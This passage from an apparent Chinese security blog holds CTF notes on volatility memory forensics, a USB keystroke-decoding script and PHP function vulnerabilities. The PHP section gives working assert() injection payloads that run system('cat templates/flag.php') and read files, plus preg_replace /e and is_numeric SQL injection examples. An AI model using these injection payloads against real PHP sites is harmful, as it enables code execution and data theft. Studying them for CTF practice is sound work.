class="line">        LIMIT <span class="number">5</span>,<span class="number">10</span>; <span class="operator">/</span><span class="operator">/</span> 代表从第<span class="number">5</span>行开始(<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行)检索<span class="number">10</span>行，即检索<span class="number">6</span><span class="number">-15</span>行,从第<span class="number">5</span><span class="operator">+</span><span class="number">1</span>行开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">95</span>,<span class="number">-1</span>; <span class="operator">/</span><span class="operator">/</span> 检索记录行 <span class="number">96</span><span class="operator">-</span>last.从<span class="number">95</span><span class="operator">+</span><span class="number">1</span>开始算</span><br><span class="line">        </span><br><span class="line">        LIMIT <span class="number">5</span>;     <span class="operator">/</span><span class="operator">/</span>检索前 <span class="number">5</span> 个记录行</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memory Forensics</title>
      <link href="/2020/01/10/Memory-Forensics/"/>
      <url>/2020/01/10/Memory-Forensics/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><h2 id="内存取证工具volatility-的使用："><a href="#内存取证工具volatility-的使用：" class="headerlink" title="内存取证工具volatility 的使用："></a>内存取证工具<strong>volatility</strong> 的使用：</h2><blockquote><p>volatility -f &lt;文件名&gt; –profile&#x3D;&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用imageinfo插件来猜测dump文件的profile值：WinXPSP2x86</span><br><span class="line"></span><br><span class="line">root@kali:# volatility -f mem.vmem imageinfo</span><br><span class="line"></span><br><span class="line">grep是用来搜索特定的字符串，bgrep是用来搜索非文本数据模式和hexdump</span><br><span class="line"></span><br><span class="line">volatility –info    用于查看volatility已经添加的profile和插件信息</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw imageinfo     判断当前镜像信息，或kdbgscan，仅适合windows内存镜像</span><br></pre></td></tr></table></figure><blockquote><p>常见插件：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 notepad      查看当前展示的notepad文本</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 pslist    列出运行的进程，如果Exit所在的一列显示了日期时间，则表明该进程已经结束了</span><br><span class="line"></span><br><span class="line">Hivelist   列出缓存在内存中的注册表</span><br><span class="line"></span><br><span class="line">Filescan  扫描内存中的文件</span><br><span class="line"></span><br><span class="line">Dumpfiles      将内存中的缓存文件导出</span><br><span class="line"></span><br><span class="line">Volatility -f file.raw –profile=WinXPSP2x86 Memdump -p 进程号 -D ./（导出目录）       将某个进程信息导出/根据pid dump出指定进程</span><br><span class="line"></span><br><span class="line">Foremost 2888.dmp    分析dump出的内存文件</span><br><span class="line"></span><br><span class="line">Svcscan  扫描windows的服务</span><br><span class="line"></span><br><span class="line">Connscan 查看网络连接</span><br><span class="line"></span><br><span class="line">Cmdscan 查看命令行上的操作</span><br></pre></td></tr></table></figure><h2 id="取证方法建议"><a href="#取证方法建议" class="headerlink" title="取证方法建议"></a>取证方法建议</h2><blockquote><p>收集数据的顺序很重要。必须首先收集易消失的数据。易失性数据是系统关闭时可能丢失的任何数据，例如连接到仍然在RAM中注册的网站。必须将先从最不稳定的证据中开始收集数据：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（1）缓存</span><br><span class="line"></span><br><span class="line">（2）路由表，进程表，内存</span><br><span class="line"></span><br><span class="line">（3）临时系统文件</span><br><span class="line"></span><br><span class="line">（4）硬盘</span><br><span class="line"></span><br><span class="line">（5）远程日志，监控数据</span><br><span class="line"></span><br><span class="line">（6）物理网络配置，网络拓扑</span><br><span class="line"></span><br><span class="line">（7）媒体文件（CD，DVD）</span><br></pre></td></tr></table></figure><h2 id="常见payload："><a href="#常见payload：" class="headerlink" title="常见payload："></a>常见payload：</h2><p>1.查看系统信息<br><code>volatility -f mem.raw imageinfo</code></p><p>在Suggested Profiles中找到操作系统的信息</p><p>2.查看运行程序列表<br><code>volatility -f mem.raw --profile=Win7SP1x64 pslist</code></p><p>部分常见进程分析：</p><p>wscntfy.exe，Windows系统关键进程，负责检查计算机的安全状态，包括防火墙、病毒防护软件、自动更新三个安全要素，如果这些服务状态不正常，系统就会在状态栏进行告警提示。这个进程也可能会被病毒软件和黑客程序伪装</p><p>ctfmon.exe，Microsoft Office产品套装的一部分，是有关输入法的一个可执行程序。它可以选择用户文字输入程序，和微软Office XP语言条。这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。另外，ctfmon.exe可能被感染上木马而成为病毒程序</p><p>wordpad.exe，是微软Microsoft Windows自带的免费字处理工具。</p><p>Conime.exe，输入法编辑器</p><p>Cmd.exe，windows系统的命令行程序</p><p>3.查看文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan</code></p><p>4.用grep命令过滤<br><code>volatility -f mem.raw --profile=Win7SP1x64 filescan |grep txt</code></p><p>5.提取文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e7c3420 -D aaa</code></p><p>6.看cmd下执行的文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 cmdscan</code></p><p>7.分离出cmd下执行的某个文件<br><code>volatility -f mem.raw --profile=Win7SP1x64 memdump -p 2884 -D aaa</code><br>-p是进程号，flag的文件在进程号为2884，分离出的文件为流量包</p><p>8.提取账户密码<br><code>volatility -f mem.raw --profile=Win7SP0x64 hashpump</code></p><p>9.查看网络连接<br><code>volatility -f mem.raw --profile=Win7SP1x64 netscan</code></p><p>10.查看已经建立的网络连接</p><p><code>volatility -f mem.raw --profile=Win7SP1x64 netscan|grep ESTABLISHED</code></p><h2 id="常见解题思路："><a href="#常见解题思路：" class="headerlink" title="常见解题思路："></a>常见解题思路：</h2><blockquote><p>主要找到键盘数据文件</p></blockquote><p>1.根据payload6查看信息，再直接利用foremost分离，将提取的信息结合分离出usb键盘数据文件</p><p>2.结合payload1-3\6,再利用binwalk -e 提取文件，再利用&#96;&#96;&#96;Tshark -r <code>命令查看键盘数据，利用</code>tshark -T fields -e usb.capdata &gt;file.path.name&#96; 输出存为文件，即为键盘数据文件</p><h2 id="USB通杀EXP"><a href="#USB通杀EXP" class="headerlink" title="USB通杀EXP"></a>USB通杀EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">USB流量分析</span></span><br><span class="line"><span class="string">    keyboard scan code转为键盘字符</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">    导出的usb流量信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">&quot;aA&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;bB&quot;</span>, <span class="number">0x06</span>:<span class="string">&quot;cC&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;dD&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;eE&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;fF&quot;</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">&quot;gG&quot;</span>, <span class="number">0x0B</span>:<span class="string">&quot;hH&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;iI&quot;</span>, <span class="number">0x0D</span>:<span class="string">&quot;jJ&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;kK&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;lL&quot;</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">&quot;mM&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;nN&quot;</span>, <span class="number">0x12</span>:<span class="string">&quot;oO&quot;</span>, <span class="number">0x13</span>:<span class="string">&quot;pP&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;qQ&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;rR&quot;</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">&quot;sS&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;tT&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;uU&quot;</span>, <span class="number">0x19</span>:<span class="string">&quot;vV&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;wW&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;xX&quot;</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">&quot;yY&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;zZ&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1!&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2@&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3#&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4$&quot;</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">&quot;5%&quot;</span>, <span class="number">0x23</span>:<span class="string">&quot;6^&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&amp;&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8*&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9(&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0)&quot;</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">&quot;  &quot;</span>, <span class="number">0x2D</span>:<span class="string">&quot;-_&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=+&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&#123;&quot;</span>, <span class="number">0x30</span>:<span class="string">&quot;]&#125;&quot;</span>,  <span class="number">0x32</span>:<span class="string">&quot;#~&quot;</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">&quot;;:&quot;</span>, <span class="number">0x34</span>:<span class="string">&quot;&#x27;\&quot;&quot;</span>,  <span class="number">0x36</span>:<span class="string">&quot;,&lt;&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&gt;&quot;</span>, <span class="number">0x4f</span>:<span class="string">&quot;&gt;&quot;</span>, <span class="number">0x50</span>:<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code2chr</span>(<span class="params">filepath</span>):</span><br><span class="line">    lines = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(filepath,<span class="string">&quot;r&quot;</span>).readlines():</span><br><span class="line">        code = <span class="built_in">int</span>(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)   <span class="comment"># 即第三个字节</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># up arrow - move up</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">            pos -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt;= pos:</span><br><span class="line">            lines.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">81</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">        code2chr(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP Function Vulnerabilities</title>
      <link href="/2019/12/18/PHP-Function-Vulnerabilities/"/>
      <url>/2019/12/18/PHP-Function-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h2><hr><p><a name="ZlIMU"></a></p><h3 id="存在命令执行漏洞"><a href="#存在命令执行漏洞" class="headerlink" title="存在命令执行漏洞"></a>存在命令执行漏洞</h3><blockquote><p><strong>功能介绍：</strong><br>**preg_replace($pattern, $replacement, $subject);****preg_replace — <strong><strong>执行一个正则表达式的搜索和替换</strong><br><strong>搜索</strong></strong><code>subject</code><strong><strong>中匹配</strong></strong><code>pattern</code><strong><strong>的部分， 以</strong></strong><code>replacement</code>****进行替换。</p></blockquote><p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。<br><a name="5e7C7"></a></p><h3 id="preg-replace漏洞触发有两个前提："><a href="#preg-replace漏洞触发有两个前提：" class="headerlink" title="preg_replace漏洞触发有两个前提："></a>preg_replace漏洞触发有两个前提：</h3><p>01：第一个参数需要e标识符，有了它可以执行第二个参数的命令<br />02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：<br />&#x2F;&#x2F;echo preg_replace(‘&#x2F;test&#x2F;e’, ‘phpinfo()’, ‘just test’);这样是可以执行命令的<br />&#x2F;&#x2F;echo preg_replace(‘&#x2F;test&#x2F;e’, ‘phpinfo()’, ‘just tesxt’); 或者echo preg_replace(‘&#x2F;tesxt&#x2F;e’, ‘phpinfo()’, ‘just test’); 这两种没有匹配上，所以返回值是第三个参数，不会执行命令</p><hr><p><a name="A8b58"></a></p><h2 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h2><hr><blockquote><p><strong>功能介绍：</strong><br><strong>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</strong></p></blockquote><p>这个函数本身没有什么问题，但是和mysql结合起来就容易出问题，那是因为is_numeric判断的时候，当碰到16进制数的时候，也会判断成数字，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;0x233333&#x27;</span>);</span><br></pre></td></tr></table></figure><p>而在mysql中，插入0x开头的16进制数的时候，会自动转成字符插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>代码的本意是想过滤掉字符输入，而当用户恶意地以16进制格式输入时，就容易绕过检查，插入恶意代码，进而可能会导致SQL注入的发生。<br />因此，要避免这样的漏洞发生，可以考虑采用正则表达式的方法来取代is_numberic函数。</p><hr><p><a name="12O0n"></a></p><h2 id="php中有两种比较符号"><a href="#php中有两种比较符号" class="headerlink" title="php中有两种比较符号"></a>php中有两种比较符号</h2><hr><p>&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较<br />&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型</p><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br />&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><hr><p><a name="guWeI"></a></p><h2 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h2><p><a name="dbadf"></a></p><h3 id="存在代码注射漏洞"><a href="#存在代码注射漏洞" class="headerlink" title="存在代码注射漏洞"></a>存在代码注射漏洞</h3><blockquote><p><strong>功能介绍：</strong><br><strong>判断一个表达式是否成立。返回true or false。</strong><br>**<br><strong>PHP 5</strong><br><strong>assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</strong><br><strong>PHP 7</strong><br><strong>assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</strong><br>**<br><strong>assert() 会检查指定的 <code>assertion</code> 并在结果为 <code>FALSE</code> 时采取适当的行动。</strong><br><strong>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行。</strong><br>**<strong>当参数为字符串时，会被当作php代码执行。</strong><br><strong>例如 assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;   <?phpinfo()?></strong></p></blockquote><p><strong>这个函数容易引起代码注射：</strong><br />eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>涉及函数:</strong></p><ul><li>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</li></ul><p>语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。</p><ul><li>file_exists() 函数检查文件或目录是否存在</li></ul><p>如果指定的文件或目录存在则返回 true，否则返回 false。<br /><br><br />根据上述特性可以对assert第一次出现的位置进行构造：<br /><strong>通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line">qwe<span class="string">&#x27;,&#x27;</span>abc<span class="string">&#x27;)===false and system(&#x27;</span>cat templates/flag.php<span class="string">&#x27;) and strops(&#x27;</span>qwe</span><br><span class="line">结果：</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;qwe&#x27;,&#x27;abc&#x27;)===false and system(&#x27;cat templates/flag.php&#x27;) and strops(&#x27;qwe&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们也可以对第二处进行构造:<br /><strong>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) or phpinfo();#</span></span><br></pre></td></tr></table></figure><blockquote><p>关于此处的#:   #是单行注释，由assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)<br>即为注释掉 ‘)<br>利用：<br />1’) or print_r(file_get_contents(‘templates&#x2F;flag.php’));#</p></blockquote><p><a name="ACije"></a></p><h3 id="相关函数用法区分"><a href="#相关函数用法区分" class="headerlink" title="相关函数用法区分"></a>相关函数用法区分</h3><p><strong>file_get_contents() 函数</strong>把整个文件读入一个字符串中。<br /><strong>语法：</strong><br />file_get_contents(<em>path</em>,<em>include_path</em>,<em>context</em>,<em>start</em>,<em>max_length</em>)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。<br />context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><p><strong>file() 函数</strong>把整个文件读入一个数组中。<br><a name="peCrR"></a></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>file(path,include_path,context)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。<br />context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><p><strong>assert与eval的区别</strong><br /><em>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</em></p><p><strong>print()</strong><br /><em>函数print()打印一个值（它的参数），如果字符串成功显示则返回true，否则返回false。</em></p><p><strong>printf()</strong><br /><em>printf()源于C语言中的printf()。该函数输出格式化的字符串。</em><br /><em>语法： printf(format,arg1,arg2,arg++)</em><br /><em>format 规定字符串以及如何格式化其中的变量；</em><br /><em>arg1, arg2, ++ 等参数将插入到主字符串中的百分号 (%) 符号处。该函数是逐步执行的。在第一个 % 符号中，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</em></p><p><a href="https://www.baidu.com/s?wd=print_r&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao"><strong>print_r</strong></a><strong>()</strong><br /><a href="https://www.baidu.com/s?wd=print_r&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao"><em>print_r</em></a><em>()可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。如， $a &#x3D; array(‘name’ &#x3D;&gt; ‘Fred’, ‘age’ &#x3D;&gt; ‘15’, ‘wife’ &#x3D;&gt; ‘Wilma’);</em></p><p><strong>echo</strong><br /><em>可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</em><br />_<br><a name="OfJyn"></a></p><h2 id="SQL语句中的函数"><a href="#SQL语句中的函数" class="headerlink" title="SQL语句中的函数"></a><em>SQL语句中的函数</em></h2><p><a name="GRqYD"></a></p><h3 id="CONV"><a href="#CONV" class="headerlink" title="CONV()"></a>CONV()</h3><blockquote><p>简单的来说这个函数就是用来进行进制的转换的</p><p>CONV(N,from_base,to_base)</p><p>N是要转换的数据，from_base是原进制，to_base是目标进制。</p><p>如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</p></blockquote><p><a name="3T1bj"></a></p><h3 id="substr（）"><a href="#substr（）" class="headerlink" title="substr（）"></a>substr（）</h3><blockquote><p>简单来说 这个函数是用来搜索字符串的</p><p> substr(string string,num start,num length);</p><p> string为字符串；</p><p> start为起始位置；</p><p> length为长度。</p><p> mysql中的start是从1开始的，而hibernate中的start是从0开始的。</p></blockquote><p><a name="ZEIxq"></a></p><h2 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h2><p><a name="vQHMa"></a></p><h3 id="魔术方法定义"><a href="#魔术方法定义" class="headerlink" title="魔术方法定义"></a>魔术方法定义</h3><p><a 